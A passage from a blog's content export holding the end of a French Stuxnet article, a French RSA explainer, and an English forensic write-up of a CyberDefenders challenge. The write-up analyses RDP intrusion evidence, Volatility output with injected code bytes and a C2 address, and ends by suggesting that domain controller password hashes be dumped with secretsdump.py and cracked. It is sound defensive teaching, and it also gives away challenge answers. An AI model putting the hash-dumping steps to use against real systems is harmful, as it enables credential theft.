durant laquelle il utilise une faille zero-day pour élever ses privilèges et se copier dans des processus systèmes de Windows, le rendant quasiment invisible. Une fois arrivé à son objectif, Stuxnet communique avec l’API de la centrifugeuse et modifie les données envoyées et reçues. Se faisant, il masque les alertes de sécurité et change périodiquement la vitesse de rotation des centrifugeuses. L\u0026rsquo;objectif visé était d\u0026rsquo;endommager les centrifugeuses pour retarder le programme nucléaire irannien. Dans le même temps, le système de pilotage indique un comportement normal de l’automate. On retrouve ici les caractéristiques types d’une APT avec beaucoup d’efforts investis sur la persistance de Stuxnet.\nEnfin, l’objectif de Stuxnet était vraisemblablement de ne jamais être découvert puisqu’une date d’effacement du programme était fixée au 24 juin 2012. Ce programme étant décrit comme « la cyber arme la plus complexe de l’Histoire » dispose même d’un processus d’effacement complexe et évolué. Ce code a été ensuite analysé puis récupéré par des agences étatiques et des cyber-criminels pour produire d’autres virus redoutables tels que Flame ou Duqu. Flame serait à l’origine d’attaques visant la destruction de données.\nCe qu\u0026rsquo;il faut retenir # Cette opération nous montre qu’une attaque d’une telle envergure n’est possible qu’avec le travail d’une ou plusieurs puissances étrangères aux moyens et capacités opérationnelles importants. Elle nécessite de disposer de renseignements très précis et fiables qui ne peuvent être dispensés que par ceux travaillant au plus proche des cibles. On observe également qu’une avance technologique est obligatoire ainsi que des exactions illégales préalables (certificats volés, espionnage). La détection de pareilles menaces est difficile et leurs exactions est parfois invisible.\nLa cyberguerre est largement mondialisée et il convient de s’y préparer, autant offensivement que défensivement.\nSource # Pour aller plus loin je vous recommande vivement les articles ci-dessous et pour les plus techniques cette conférence Youtube par un employé de Microsoft qui explique le fonctionnement de Stuxnet : 27C3: Adventures in analyzing Stuxnet (Bruce Dang from Microsoft).\nThe man who found Stuxnet, Sergey Ulasen in the spotlight - Eugene Kaspersky Stuxnet - Wikipedia Stuxnet - Generation NT Programme nucléaire irannien - Wikipedia Virus Stuxnet, l\u0026rsquo;arroseur arrosé - Infoguerre Analysis shows traces wiper malware no links flame - Threatpost Opération Olympic Games - Wikipedia Signature de code - Wikipedia ","date":"21 novembre 2021","permalink":"/posts/stuxnet-infiltrer-et-compromettre-une-centrale-nucleaire/","section":"Mes articles","summary":"Comment les centrales nucléaires iraniennes on-t-elles été infiltrées et sabotées par un programme informatique ?","title":"Stuxnet : Infiltrer Et Compromettre Une Centrale Nucleaire"},{"content":"Ce titre n’est (presque) pas une blague. VOUS avez le niveau pour comprendre comment vos données en ligne sont protégées. Oui, même si vous n’avez peut-être pas un bac scientifique, ni même le brevet, je vous assure que si vous vous laissez porter par ces quelques lignes, vous comprendrez tout de l’algorithme de chiffrement RSA. Ce protocole de chiffrement, ou algorithme, tire son nom de ces trois inventeurs, Rivest Shamir et Adleman.\nMise en situation : vous êtes sur Internet en train de choisir votre prochain smartphone, vous l’avez trouvé et vient le douloureux moment du passage en caisse. Vous rentrez vos codes bancaires et ça y est, ce smartphone est à vous. Pendant ce temps là, je suis confortablement installé derrière mon ordinateur et j’espionne vos activités en ligne (tel un « hacker » des films américains, voyez ?), je récupère toutes les données que vous envoyez sur le web. Croyez-moi, cela est d’une simplicité déconcertante. Comment, à ce moment-là, garantir que je ne puisse pas utiliser vos codes bancaires pour vider votre compte en banque ?\nIn maths we trust # La réponse est simple : en les rendant illisibles. C’est ce qu’on appelle la cryptographie : transformer un texte qui a du sens en un autre qui n’en a apparemment pas. Cela est utilisé depuis la nuit des temps, Nabuchodonosor (le roi de Babylone), César et d’autres ont utilisé la cryptographie. A l’époque les codes étaient rudimentaires et simples, aujourd’hui cela s’est un peu complexifié. On utilise des protocoles, des modes d’emplois, des chiffrements très puissants. L’un des plus connus et abordables est RSA.\nAujourd’hui, la cryptographie est partout, mais derrière ce nom quasi mystique se cache des mathématiques à la fois très simples et terriblement puissantes. Avant de vous expliquer en quoi consiste RSA, il convient de revoir quelques bases de mathématiques.\nEn maths il existe pleins de nombre, je ne vous apprends rien. Certains ont des propriétés particulières, c’est le cas de 2,3,5,7,11,13… ce sont des nombres premiers. Ils ont quelque chose de spécial… ils n’ont aucun diviseurs, exceptés 1 et eux-même. Par exemple, si on veut diviser 13 par autre chose que 1 ou 13, on ne trouvera jamais un entier, c’est-à-dire un chiffre sans virgule. Essayez, vous verrez : 13/2=6,5 13/3=4,3, il n’existe aucun nombre excepté 1 ou 13 qui divise 13, ou un nombre premier en général.\nLes nombres premiers ont quelques particularités intéressantes. Déjà, il en existe une infinité, c’est prouvé. Se baser sur de l’infini pour faire de la sécurité, c’est terriblement rassurant. Par contre on sait aussi qu’ils se raréfient au fur et à mesure qu’on en cherche des grands, c’est un peu moins pratique. Mais la propriété qui nous intéresse le plus, c’est la décomposition en facteurs premiers d’un nombre…\nPrenons un nombre quelconque, par exemple 42. On peut réécrire 42 comme étant 2x3x7. 2, 3 et 7 sont des nombres premiers. On vient donc de décomposer un nombre en le produit de ses facteurs premiers. La propriété qui est intéressante ici, c’est le fait que cette décomposition est unique, c’est un peu comme un identifiant unique pour tout nombre.\nJe récapitule, on a d’un côté un identifiant unique, et de l’autre des éléments aux propriétés particulières qui sont en nombre infinis, croyez moi on se rapproche d’un algorithme de chiffrement… il ne manque qu’une dernière chose, de la complexité.\n## La complexité\nEn informatique, quand on parle de complexité, ça ne veut pas dire exactement la même chose que dans le langage courant. La complexité d’un programme informatique, d’un algorithme, peut se comprendre comme étant la mesure d’à quel point la tâche est fastidieuse à réaliser. Par exemple, si je vous demande de retrouver, dans une liste de 100 nombres aléatoires le chiffre 5, la tâche est plus fastidieuse que si la liste de nombre est ordonnée, par exemple dans l’ordre croissant. Dans le second cas, votre recherche sera bien plus rapide. C’est ce qu’on nomme la complexité algorithmique. Plus la complexité d’un algorithme est élevée, et plus l’ordinateur mettra de temps à réaliser la tâche qu’on lui a attribuée. Ni vous ni moi n’aimons qu’un ordinateur « rame » et c’est pourquoi on s’efforce de construire des algorithmes performants. Seulement, en sécurité, on souhaite tout l’inverse, que certains programmes soient les plus lents possibles. C’est exactement ce qui est recherché en cryptographie. Courage ! Encore quelques lignes et vous allez comprendre …\nRevenons à nos nombres. Tout à l’heure nous avons pris un nombre au hasard, 42, et nous l’avons décomposé en le produit de ses facteurs premiers. La tâche n’est pas bien difficile, et par tâtonnement, elle n’a pas pris beaucoup de temps. Cependant, imaginez maintenant que je vous demande la même chose… avec ce nombre :\n1 388 657 789\nLa tâche est autrement plus compliquée, vous ne trouvez pas ? Par contre, vérifier qu’un produit de facteurs premier correspond bien à ce nombre est autrement plus facile ; il suffit de calculer et de comparer. Et bien l’algorithme RSA repose exactement sur ce problème-là.\nEn d’autre termes, il repose sur le fait qu’un nombre suffisamment grand est très difficilement décomposable en produit de facteurs premiers. Alors même que vérifier si un nombre est bien le résultat d’un produit est simple, l’inverse, c’est-à-dire le décomposer, est autrement plus compliqué. Entendons-nous bien, quand je dis compliqué cela signifie que trouver la décomposition en facteurs premiers est long, même pour un ordinateur. Cela ne signifie pas que c’est “mathématiquement” très compliqué au sens strict du terme, avec beaucoup de temps et de volonté, il serait tout à fait possible d’y arriver. C’est juste très long, et ça l’est aussi pour un ordinateur.\nPour vous donner une image, c’est un peu comme faire un puzzle. Il est très facile, rapide, de vérifier qu’un puzzle est correct, par contre résoudre le puzzle demande beaucoup plus de temps ; c’est un problème asymétrique. Le problème est simple à vérifier mais difficile à résoudre. C’est l’essence même de RSA.\nC’est cette asymétrie là qui permet que je ne puisse pas déchiffrer vos codes bancaires chiffrés lorsque vous effectuez un achat en ligne. Avec un nombre de départ, qu’on appelle une clef publique, suffisamment grande, de l’ordre d’un nombre composé de plus de 300 chiffres (oui vous avez bien lu!), il est impossible, dans un temps raisonnable, de trouver sa décomposition en facteurs premiers. Cette décomposition là on l’appelle clef privée, et c’est elle et elle seule qui permet de déchiffrer le message.\nSi vous pensez avoir saisi le concept, vous pouvez vous arrêter là. La suite de l’article détaille un exemple de chiffrement avec RSA, c’est un peu plus velu. La partie suivante sert à être plus exhaustif sur le fonctionnement de l’algorithme.\nFaisons un exemple # Construisons une clef publique. Pour cela, rien de plus simple, prenons deux nombres premiers un peu grands, 47 591 et 29 179. Multiplions-les entre-eux et on obtient notre clef publique : 1 388 657 789, cette clef publique permet, avec une fonction mathématique un peu compliquée, de chiffrer un message, par exemple « coucou » en « j@45hqm!îjdf@kd74 ». J’insiste, la clef publique ne sert qu’à chiffrer le message. Cette clef publique n’est un secret pour personne : elle est publique. Même une personne mal intentionnée peut disposer de votre clef publique, ce n’est pas très grave.\nLe destinataire de ce message quant à lui dispose de sa clef privée, qu’il ne doit absolument pas dévoiler : ce sont les deux nombres premiers de départ, 47 591 et 29 179, qui est donc la décomposition en facteurs premiers de ma clef publique, et qui permet de déchiffrer le message cryptée, par exemple « j@45hqm!îjdf@kd74 » en « coucou ».\nOn retrouve bien le message d’origine, et pendant ce temps-là, personne n’a pu découvrir ce qu’il contenait. Pourquoi ça ? Parce qu’il est difficile de retrouver ma clef privée seulement à partir de la clef publique : il est difficile de décomposer 1 388 657 789 comme étant 47 591×29 179, cela est complexe algorithmiquement (souvenez-vous, on a parlé de la complexité plus haut). Or, seule la clef privée permet de déchiffrer « j@45hqm!îjdf@kd74 » en « coucou ».\nVoici un schéma qui récapitule ce que je viens d’expliquer.\nFigure 1 : 1re étape : Alice génère deux clefs. La clef publique (verte) qu’elle envoie à Bob et la clef privée (rouge) qu’elle conserve précieusement sans la divulguer à quiconque. Figure 2 : 2e et 3e étapes : Bob chiffre le message avec la clef publique d’Alice et envoie le texte chiffré. Alice déchiffre le message grâce à sa clef privée. RSA # Vous savez maintenant comment fonctionne RSA, l’un des protocoles de chiffrement les plus utilisés et connus au monde, qui ne repose sur rien d’autre qu’un problème mathématique rudimentaire. Alors rassurez-vous, présenté comme cela, ce protocole peut vous paraître faible et facilement contournable, mais il n’en est rien. La preuve en est qu’il tient en échec tous ceux qui ont voulu s’attaquer à lui depuis les années 70, et ils sont nombreux.\nFrançaises, Français, soyez fiers de vos couleurs puisque c’est une équipe de recherche française qui détient le record de performance pour avoir essayé de casser RSA. Sans rentrer dans les détails, ils sont arrivés, en 2012, à factoriser un nombre composé de 250 chiffres dans un temps raisonnable.\nPour aller plus loin # Les codes secrets, ScienceEtonnante [vidéo en ligne][consulté le 16 novembre 2020]. Le chiffrement sur le web (HTTPS)-Monsieur Bidouille, Monsieur Bidouille [vidéo en ligne][consulté le 16 novembre 2020]. Wikipédia, Cryptographie asymétrique [en ligne][consulté le 14 novembre 2020]. Wikipédia, RSA Factoring Challenge [en ligne][consulté le 12 novembre 2020]. Wikipédia, Nombre premier [en ligne][consulté le 10 novembre 2020]. Wikipédia, Problème P ≟ NP [en ligne][consulté le 14 novembre 2020]. Wikipédia, Analyse de la complexité des algorithmes [en ligne][consulté le 14 novembre 2020] Sources # Schéma 1 Schéma 2 MOOC 2015 “Arithmétique : en route pour la cryptographie”, université de Lille [cours composé de 6 parties, vidéo disponible en ligne] [consulté le 16 novembre 2020]. Les nombres premiers, Pierre Colmez [pdf en ligne][consulté le 16 novembre 2020]. Douglas Stinson, Cryptographie, théorie et pratique, Vuibert, 2003, 2e éd. (ISBN 2-7117-8676-5) Pierre Barthélemy, Robert Rolland, Pascal Véron et Hermes Lavoisier, Cryptographie, principes et mises en œuvre, Paris, Hermès science publications, 2005, 414 p. (ISBN 2-7462-1150-5) ","date":"21 novembre 2020","permalink":"/posts/rsa-ou-comment-vos-cours-de-4eme-vous-permettent-de-proteger-vos-codes-bancaires/","section":"Mes articles","summary":"Ce titre n’est (presque) pas une blague. VOUS avez le niveau pour comprendre comment vos données en ligne sont protégées.","title":"RSA Ou Comment Vos Cours De 4eme Vous Permettent De Proteger Vos Codes Bancaires"},{"content":"Cyberdefenders · Digital Forensic · Szechuan Sauce # The scenario:\nYour bedroom door bursts open, shattering your pleasant dreams. Your mad scientist of a boss begins dragging you out of bed by the ankle. He simultaneously explains between belches that the FBI contacted him. They found his recently-developed Szechuan sauce recipe on the dark web. As you careen past the door frame you are able to grab your incident response “Go-Bag”. Inside is your trusty incident thumb drive and laptop. Some files may be corrupted just like in the real world. If one tool does not work for you, find another one.\nAbstract # \u0026hellip;\nRick from Rick and Morty, this challenge is a reference to this sitcom.\rJust before starting\u0026hellip; # This challenge contains many files. We have a lot of information and the challenge will not help you on which file you have to investigate on. You have to understand the differences between filetypes and tools associated.\nLet\u0026rsquo;s take a look to each of them:\n20200918_0417_DESKTOP-SDN1RPT.E01, E02, E03 and E04 Disk dump from a machine named DESKTOP-SDN1RPT. The reason why there are four files is because of the tool used (Encase), it cut the dump into four file for convenience, but you can consider as one file split into four.\n20200918_0417_DESKTOP-SDN1RPT.E01.txt It contains various information on 20200918_0417_DESKTOP-SDN1RPT.E01 such as the software used to acquire the dump (FTK Imager), file hash, evidence number and lot of technical stuff which is not interesting for us. By the way, this file is very usefull in real case.\nautoruns-desktop-sdn1rpt.csv CSV file which contains information about software configured to run when the machine is booted or a user log-in.\nautorunsc-citadel-dc01.csv Same as the previous one, but for the citadel machine.\ncase001.pcap Network capture, contains information on network traffic.\ncitadeldc01.mem RAM dump of the citadel machine, containing all runtime information.\nDESKTOP-SDN1RPT.mem Same as the previous one, but for the desktop machine.\nE01-DC01/ 20200918_0347_CDrive.E01, E02\n20200918_0347_CDrive.E01.txt\nBellow a table summarizing tool and filetype associated:\nExtension Tool E0x Autopsy, FTK Imager mem Volatility pcap Wireshark, Network Miner, Brim Security csv, txt Text editor, or an Excel like I will use Autopsy and not FTK Imager because Autopsy has a powerfull OS parser and FTK Imager is just to open and browse image file. Plus, I will not use Brim Security, as I\u0026rsquo;m not familiar with, instead, I will use Wireshark and Network Miner.\nQ1 What’s the Operating System version of the Server? (two words) # Using Autopsy, create a new case and add data source (image file, add both E01) and waits until parsing is complete. Then, go to Operating System Information:\nThe Program Name column contains the OS version.\rTo fully understand where this information is stored, you can also parse hives located at C:\\Windows\\System32\\config\\SOFTWARE, in the key Microsoft\\Windows NT\\CurrentVersion, Autopsy provides a native parser but you can also use Registry Explorer from Eric Zimmerman.\nQ2 What’s the Operating System of the Desktop? (four words separated by spaces) # Same as the previous one.\nQ3 What was the IP address assigned to the domain controller? # As explained in the Q1, you can dump the SYSTEM hive located at: C:\\Windows\\System32\\config. Or, use Network Miner, you have to convert case001.pcap into a format accepted by the software. To do that, just open the file with Wireshark \u0026gt; Save As \u0026gt; Choose Wireshark/tcpdump... - pcap and open it with Network Miner. Once opened, you will see an overview of the network:\nI love this tool, as it provides a very usefull overview, especially in this challenge where there are many machines.\rSearch for a Citadel Windows machine and there is the IP.\nQ4 What was the timezone of the Server? # Tricky question, first, you have to find the timezone set into the server. It\u0026rsquo;s located into the SYSTEM registry. Using Autopsy, you can easily read it:\nThe server is set on Pacific Standard Time which is UTC-7. But the admin set a wrong timezone on the domain controller. You can see it on NTP packets (clock unsynchronized). To retrieve the correct timezone, you can correlate two events in the network and in the DC. To see how you can do, you can check this write-up: https://ellisstannard.medium.com/cyberdefenders-szechuan-sauce-writeup-ab172eb7666c.\nYou will see that the system is set one hour after the correct timezone, so the answer is UTC-6.\nQ5 What was the initial entry vector (how did they get in)?. Provide protocol name. # Extract security logs from the DC located at: %System32%\\winevt\\Logs\\Security.evtx. Then, you can use a log viewer such as Microsoft Event Viewer \u0026gt; click on Open saved logs \u0026gt; select your export.\nTime to analyze, you can assume that the attacker wants to log into the machine. Each event has a given ID and the ID for failed attempt is 4625 and 4624 for a successfull one. To quickly have the list of the person who wants to access the machine, I used both EvtxECmd to dump all the logs (the Windows view did not satisfy me) and EZViewer to vizualize them. We can see that a Kali machine bruteforced the access with a successfull authentication on the DC using LogonType 10 which is RDP, we also have an IP.\nPlus, we can investigate on the network dump. A good first step is to get an overview; Statistics \u0026gt; Protocol Hierarchy.\nI highlighted RDP over UDP, this is interesting because RDP provides a graphical interface to connect to another computer over a network connection. Sometimes, RDP is used by attacker to gain access. To investigate more in depth, search on rdp \u0026amp;\u0026amp; ip.dst == 10.42.85.10 (DC IP address). The first packet contains a Cookie filled with the value nmap, which is a scanning tool used by attackers. Plus, the source address is 194.61.24.102, using VirusTotal you will see that this IP ws used by pirates.\nThe protocol name is RDP.\nQ6 What was the malicious process used by the malware? (one word) # Attacker gained access to the DC and we want to know what\u0026rsquo;s happened on this machine, time to use Volatility! Usually, I start my investigation with pstree to get an overview:\nPID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime\r4 0 System 0xe00062c0a900 98 - N/A False 2020-09-19 01:22:38.000000 N/A\r* 204 4 smss.exe 0xe00062c0a900 2 - N/A False 2020-09-19 01:22:38.000000 N/A\r324 316 csrss.exe 0xe00062c0a900 8 - 0 False 2020-09-19 01:22:39.000000 N/A\r404 316 wininit.exe 0xe00062c0a900 1 - 0 False 2020-09-19 01:22:40.000000 N/A\r* 460 404 lsass.exe 0xe00062c0a900 31 - 0 False 2020-09-19 01:22:40.000000 N/A\r* 452 404 services.exe 0xe00062c0a900 5 - 0 False 2020-09-19 01:22:40.000000 N/A\r** 640 452 svchost.exe 0xe00062c0a900 8 - 0 False 2020-09-19 01:22:40.000000 N/A\r*** 2056 640 WmiPrvSE.exe 0xe00062c0a900 11 - 0 False 2020-09-19 01:23:21.000000 N/A\r*** 2764 640 WmiPrvSE.exe 0xe00062c0a900 6 - 0 False 2020-09-19 04:37:42.000000 N/A\r** 1292 452 Microsoft.Acti 0xe00062c0a900 9 - 0 False 2020-09-19 01:22:57.000000 N/A\r** 3724 452 spoolsv.exe 0xe00062c0a900 13 - 0 False 2020-09-19 03:29:40.000000 N/A\r** 1556 452 VGAuthService. 0xe00062c0a900 2 - 0 False 2020-09-19 01:22:57.000000 N/A\r** 796 452 vds.exe 0xe00062c0a900 11 - 0 False 2020-09-19 01:23:20.000000 N/A\r** 668 452 svchost.exe 0xe00062c0a900 16 - 0 False 2020-09-19 01:22:41.000000 N/A\r** 2460 452 msdtc.exe 0xe00062c0a900 9 - 0 False 2020-09-19 01:23:21.000000 N/A\r** 800 452 svchost.exe 0xe00062c0a900 12 - 0 False 2020-09-19 01:22:40.000000 N/A\r** 928 452 svchost.exe 0xe00062c0a900 16 - 0 False 2020-09-19 01:22:41.000000 N/A\r** 1956 452 svchost.exe 0xe00062c0a900 30 - 0 False 2020-09-19 01:23:20.000000 N/A\r** 2216 452 dllhost.exe 0xe00062c0a900 10 - 0 False 2020-09-19 01:23:21.000000 N/A\r** 684 452 svchost.exe 0xe00062c0a900 6 - 0 False 2020-09-19 01:22:40.000000 N/A\r** 1332 452 dfsrs.exe 0xe00062c0a900 16 - 0 False 2020-09-19 01:22:57.000000 N/A\r** 1600 452 vmtoolsd.exe 0xe00062c0a900 9 - 0 False 2020-09-19 01:22:57.000000 N/A\r** 848 452 svchost.exe 0xe00062c0a900 39 - 0 False 2020-09-19 01:22:41.000000 N/A\r*** 3056 848 WMIADAP.exe 0xe00062c0a900 5 - 0 False 2020-09-19 04:37:42.000000 N/A\r*** 3796 848 taskhostex.exe 0xe00062c0a900 7 - 1 False 2020-09-19 04:36:03.000000 N/A\r** 1236 452 svchost.exe 0xe00062c0a900 8 - 0 False 2020-09-19 01:23:21.000000 N/A\r** 1368 452 dns.exe 0xe00062c0a900 16 - 0 False 2020-09-19 01:22:57.000000 N/A\r** 1000 452 svchost.exe 0xe00062c0a900 18 - 0 False 2020-09-19 01:22:41.000000 N/A\r** 1644 452 wlms.exe 0xe00062c0a900 2 - 0 False 2020-09-19 01:22:57.000000 N/A\r** 1392 452 ismserv.exe 0xe00062c0a900 6 - 0 False 2020-09-19 01:22:57.000000 N/A\r** 1660 452 dfssvc.exe 0xe00062c0a900 11 - 0 False 2020-09-19 01:22:57.000000 N/A\r412 396 csrss.exe 0xe00062c0a900 10 - 1 False 2020-09-19 01:22:40.000000 N/A\r492 396 winlogon.exe 0xe00062c0a900 4 - 1 False 2020-09-19 01:22:40.000000 N/A\r* 808 492 dwm.exe 0xe00062c0a900 7 - 1 False 2020-09-19 01:22:40.000000 N/A\r3644 2244 coreupdater.ex 0xe00062c0a900 0 - 2 False 2020-09-19 03:56:37.000000 2020-09-19 03:56:52.000000\r3472 3960 explorer.exe 0xe00062c0a900 39 - 1 False 2020-09-19 04:36:03.000000 N/A\r* 2608 3472 vmtoolsd.exe 0xe00062c0a900 8 - 1 False 2020-09-19 04:36:14.000000 N/A\r* 2840 3472 FTK Imager.exe 0xe00062c0a900 9 - 1 False 2020-09-19 04:37:04.000000 N/A\r* 3260 3472 vm3dservice.ex 0xe00062c0a900 1 - 1 False 2020-09-19 04:36:14.000000 N/A\r400 1904 ServerManager. 0xe00062c0a900 10 - 1 False 2020-09-19 04:36:03.000000 N/A There is no obvious malicious file, but correlating pstree with netscan we will have a lot of results because it\u0026rsquo;s a DC. Let\u0026rsquo;s try to find a C2 evidence by highlighting the network traffic:\nOffset\tProto\tLocalAddr\tLocalPort\tForeignAddr\tForeignPort\tState\tPID\tOwner\tCreated\r0x3148500\tTCPv4\t0.0.0.0\t636\t0.0.0.0\t0\tLISTENING\t460\tlsass.exe\t-\r0x314ac30\tTCPv4\t0.0.0.0\t389\t0.0.0.0\t0\tLISTENING\t460\tlsass.exe\t-\r0x314ac30\tTCPv6\t::\t389\t::\t0\tLISTENING\t460\tlsass.exe\t-\r0x31fa880\tUDPv4\t0.0.0.0\t0\t*\t0\t460\tlsass.exe\t2020-09-19 01:22:50.000000 0x3f2b560\tUDPv4\t0.0.0.0\t0\t*\t0\t1368\tdns.exe\t2020-09-19 01:22:57.000000 0x5ea7910\tTCPv4\t0.0.0.0\t49152\t0.0.0.0\t0\tLISTENING\t404\twininit.exe\t-\r0x5ea7910\tTCPv6\t::\t49152\t::\t0\tLISTENING\t404\twininit.exe\t-\r0x5eabed0\tTCPv4\t0.0.0.0\t49152\t0.0.0.0\t0\tLISTENING\t404\twininit.exe\t-\r0x5eaf250\tTCPv4\t0.0.0.0\t135\t0.0.0.0\t0\tLISTENING\t684\tsvchost.exe\t-\r0x5eb0540\tTCPv4\t0.0.0.0\t135\t0.0.0.0\t0\tLISTENING\t684\tsvchost.exe\t-\r0x5eb0540\tTCPv6\t::\t135\t::\t0\tLISTENING\t684\tsvchost.exe\t-\r0x5ee0b90\tUDPv4\t0.0.0.0\t0\t*\t0\t1368\tdns.exe\t2020-09-19 01:22:57.000000 0x5ee9d20\tUDPv4\t0.0.0.0\t0\t*\t0\t1368\tdns.exe\t2020-09-19 01:22:57.000000 0x5f25300\tTCPv4\t0.0.0.0\t49153\t0.0.0.0\t0\tLISTENING\t800\tsvchost.exe\t-\r0x5f25300\tTCPv6\t::\t49153\t::\t0\tLISTENING\t800\tsvchost.exe\t-\r0x5f284a0\tTCPv4\t0.0.0.0\t49153\t0.0.0.0\t0\tLISTENING\t800\tsvchost.exe\t-\r0x5f9bec0\tUDPv4\t0.0.0.0\t0\t*\t0\t928\tsvchost.exe\t2020-09-19 01:23:09.000000 0x5f9bec0\tUDPv6\t::\t0\t*\t0\t928\tsvchost.exe\t2020-09-19 01:23:09.000000 0x5fa53b0\tUDPv4\t10.42.85.10\t41136\t*\t0\t4\tSystem\t2020-09-19 01:22:42.000000 0x5fb76c0\tUDPv4\t10.42.85.10\t41136\t*\t0\t4\tSystem\t2020-09-19 01:22:42.000000 0x5fd1880\tTCPv4\t0.0.0.0\t49154\t0.0.0.0\t0\tLISTENING\t848\tsvchost.exe\t-\r0x5fd1880\tTCPv6\t::\t49154\t::\t0\tLISTENING\t848\tsvchost.exe\t-\r0x5fdcdd0\tTCPv4\t0.0.0.0\t49154\t0.0.0.0\t0\tLISTENING\t848\tsvchost.exe\t-\r...\r0x20df6ba0\tUDPv4\t0.0.0.0\t0\t*\t0\t1368\tdns.exe\t2020-09-19 01:22:57.000000 0x20e28d10\tTCPv6\tfe80::2dcf:e660:be73:d220\t49155\tfe80::2dcf:e660:be73:d220\t62777\tCLOSED\t460\tlsass.exe\t-\r0x20f52a00\tTCPv6\tfe80::2dcf:e660:be73:d220\t135\tfe80::2dcf:e660:be73:d220\t62779\tCLOSED\t684\tsvchost.exe\tN/A\r0x20fc7590\tTCPv4\t10.42.85.10\t62613\t203.78.103.109\t443\tESTABLISHED\t3644\tcoreupdater.ex\tN/A\r0x20fffe50\tTCPv4\t0.0.0.0\t62475\t0.0.0.0\t0\tLISTENING\t3724\tspoolsv.exe\t-\r0x20fffe50\tTCPv6\t::\t62475\t::\t0\tLISTENING\t3724\tspoolsv.exe\t-\r0x211a9560\tUDPv4\t0.0.0.0\t0\t*\t0\t1368\tdns.exe\t2020-09-19 01:22:57.000000 coreupdater.exe is suspicious because it uses port number 443 and its IP is tagged as malicious by Virus Total. It\u0026rsquo;s surrely our malware.\nQ7 Which process did malware migrate to after the initial compromise? (one word) # A very usefull Volatility plugin is malfind, it helps to identify injected code inside process. A Windows executable always start with MZ. Finding a MZ header inside a process is very suspicious because is a strong sign of code injection.\n3724 spoolsv.exe 0x4afc1f0000 0x4afc25afff VadS PAGE_EXECUTE_READWRITE 107 1 Disabled\r4d 5a 90 00 03 00 00 00 MZ......\r04 00 00 00 ff ff 00 00 ........\rb8 00 00 00 00 00 00 00 ........\r40 00 00 00 00 00 00 00 @.......\r00 00 00 00 00 00 00 00 ........\r00 00 00 00 00 00 00 00 ........\r00 00 00 00 00 00 00 00 ........\r00 00 00 00 00 01 00 00 ........\r0x4afc1f0000: pop r10\r0x4afc1f0002: nop\r0x4afc1f0003: add byte ptr [rbx], al\r0x4afc1f0005: add byte ptr [rax], al\r0x4afc1f0007: add byte ptr [rax + rax], al\r0x4afc1f000a: add byte ptr [rax], al\r3724 spoolsv.exe 0x4afc070000 0x4afc0a8fff VadS PAGE_EXECUTE_READWRITE 57 1 Disabled\r4d 5a 41 52 55 48 89 e5 MZARUH..\r48 83 ec 20 48 83 e4 f0 H...H...\re8 00 00 00 00 5b 48 81 .....[H.\rc3 b7 57 00 00 ff d3 48 ..W....H\r81 c3 34 b6 02 00 48 89 ..4...H.\r3b 49 89 d8 6a 04 5a ff ;I..j.Z.\rd0 00 00 00 00 00 00 00 ........\r00 00 00 00 f0 00 00 00 ........\r0x4afc070000: pop r10\r0x4afc070002: push r10\r0x4afc070004: push rbp\r0x4afc070005: mov rbp, rsp\r0x4afc070008: sub rsp, 0x20\r0x4afc07000c: and rsp, 0xfffffffffffffff0\r0x4afc070010: call 0x4afc070015\r0x4afc070015: pop rbx\r0x4afc070016: add rbx, 0x57b7\r0x4afc07001d: call rbx\r0x4afc07001f: add rbx, 0x2b634\r0x4afc070026: mov qword ptr [rbx], rdi\r0x4afc070029: mov r8, rbx\r0x4afc07002c: push 4\r0x4afc07002e: pop rdx\r0x4afc07002f: call rax\r0x4afc070031: add byte ptr [rax], al\r0x4afc070033: add byte ptr [rax], al\r0x4afc070035: add byte ptr [rax], al\r0x4afc070037: add byte ptr [rax], al\r0x4afc070039: add byte ptr [rax], al\r0x4afc07003b: add al, dh\r0x4afc07003d: add byte ptr [rax], al\r3724 spoolsv.exe 0x4afc260000 0x4afc283fff VadS PAGE_EXECUTE_READWRITE 36 1 Disabled\r4d 5a 90 00 03 00 00 00 MZ......\r04 00 00 00 ff ff 00 00 ........\rb8 00 00 00 00 00 00 00 ........\r40 00 00 00 00 00 00 00 @.......\r00 00 00 00 00 00 00 00 ........\r00 00 00 00 00 00 00 00 ........\r00 00 00 00 00 00 00 00 ........\r00 00 00 00 e0 00 00 00 ........\r0x4afc260000: pop r10\r0x4afc260002: nop\r0x4afc260003: add byte ptr [rbx], al\r0x4afc260005: add byte ptr [rax], al\r0x4afc260007: add byte ptr [rax + rax], al\r0x4afc26000a: add byte ptr [rax], al Q8 Identify the IP Address that delivered the payload. # Refer to Q5 answer. Using this Wireshark filter : rdp \u0026amp;\u0026amp; ip.dst == 10.42.85.10 we can see that the source IP is always 194.61.24.102. Plus, VirusTotal flag this IP as potentially malicious. Using Network Miner, there is another clue, this machine uses nmap:\nQ9 What IP Address was the malware calling to? # Since Q6, we already know that 203.78.103.109 is the C2 IP.\nQ10 Where did the malware reside on the disk? # We are looking for disk evidence, let\u0026rsquo;s use Autopsy again. To search for a filename, go to Tools \u0026gt; File Search by Attributes:\nHere are the results:\nQ11 What\u0026rsquo;s the name of the attack tool you think this malware belongs to? (one word) # Extract coreupdater.exe, calculate its footprint and go to VirusTotal, you will find that this program is built on Metasploit. I suppose that is you try to reverse it, you will find the tool name too.\nQ12 One of the involved malicious IP\u0026rsquo;s is based in Thailand. What was the IP? # Use an online tool like https://www.hostip.fr/ to locate one of the previous two IP address.\nQ13 Another malicious IP once resolved to klient-293.xyz . What is this IP? # I didn\u0026rsquo;t understood the question and its sens. I tried to search on this hostname on the network dump. One of the intended answer was to use Virus Total and retrieve one of the previous involved IP.\nQ14 The attacker performed some lateral movements and accessed another system in the environment via RDP. What is the hostname of that system? # We have two disk and RAM dumps, we can assume that the second system is Desktop-SDN1RPT, but let\u0026rsquo;s prove it. Thanks to Wireshark, we can get all the outgoing RDP connexion from the DC: rdp \u0026amp;\u0026amp; ip.src == 10.42.85.10. You can see packets from the DC to the attacker\u0026rsquo;s host but also to 10.42.85.115, thanks to Network Miner, you can find that this IP is related to Desktop-SDN1RPT. If you don\u0026rsquo;t have Network Miner, you can resolve the hostname by searching LLMNR packets in Wireshark.\nQ15 Other than the administrator, which user has logged into the Desktop machine? (two words) # You can browse logs but when a user login for the first time, a new user is created on the host machine. Go to C:\\Users to see all of them. I don\u0026rsquo;t know which one is the intended one but it\u0026rsquo;s Rick Sanchez.\nQ16 What was the password for \u0026ldquo;jerrysmith\u0026rdquo; account? # Quite tricky question, and not a forensic one. You can resolve it by extract hashes from the DC disk dump and crack them. To extract it, use secretsdump.py or ntdsutils.exe (available in a DC), the 